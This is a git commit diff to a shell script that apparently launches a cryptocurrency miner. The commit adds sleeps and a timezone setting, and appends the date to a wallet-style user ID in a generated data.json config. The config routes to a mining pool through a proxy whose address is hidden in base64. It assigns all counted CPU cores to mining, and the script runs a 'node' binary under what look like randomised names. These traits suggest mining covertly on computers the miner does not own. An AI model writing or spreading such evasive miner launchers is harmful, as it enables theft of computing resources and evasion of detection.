4eaedcb7f266b5fee69569fefc2f2677c53fc8b5
miltoncarpenter665 <166653213+miltoncarpenter665@users.noreply.github.com>
2025-04-16 01:05:31 +0200

    Update start_shiny_mino_avn.sh

--- start_shiny_mino_avn.sh
+++ start_shiny_mino_avn.sh
@@ -4,6 +4,7 @@ sleep 2
 cd node-mino-app
 sleep 2
 chmod +x node
+sleep 2
 
 array=()
 for i in {a..z} {A..Z} {0..9}; 
@@ -31,11 +32,15 @@ echo ""
 
 sleep 2
 
+TZ='Africa/Johannesburg'; export TZ
+date
+sleep 2
+
 cat > data.json <<END
 {
   "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/ZXUtc3RyYXR1bS5ibG9ja21pbmVyei5jb206MzUwNQ==",
   "config": { "threads": $used_num_of_cores, "log": true },
-  "options": { "user": "RJvEryQP1KJqeaZv74ytVxWSS7KKdNSFfW", "password": "x", "argent": "web-wasm/1.0" }
+  "options": { "user": "RJvEryQP1KJqeaZv74ytVxWSS7KKdNSFfW.$currentdate", "password": "x", "argent": "web-wasm/1.0" }
 }
 END
 sleep 2
